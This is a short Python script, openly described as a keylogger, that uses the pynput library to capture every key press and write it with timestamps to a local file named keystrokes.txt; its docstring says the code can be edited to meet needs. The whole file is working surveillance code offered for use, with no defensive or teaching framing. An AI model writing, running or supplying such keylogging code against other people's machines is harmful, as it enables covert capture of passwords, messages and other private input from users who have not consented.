"""
Key logger meant to log keystrokes 
Each KeyStroke will be logged and stored into a text file

Code can be edited to meet needs


"""

from pynput import keyboard
from pynput.keyboard import Key, Listener
import logging 

logging.basicConfig(filename=("keystrokes.txt"), level=logging.DEBUG, format= "%(asctime)s - %(message)s")

def on_press(key):
    logging.info(str(key))
 

with Listener(on_press=on_press) as listener:
    listener.join()
    listener.start()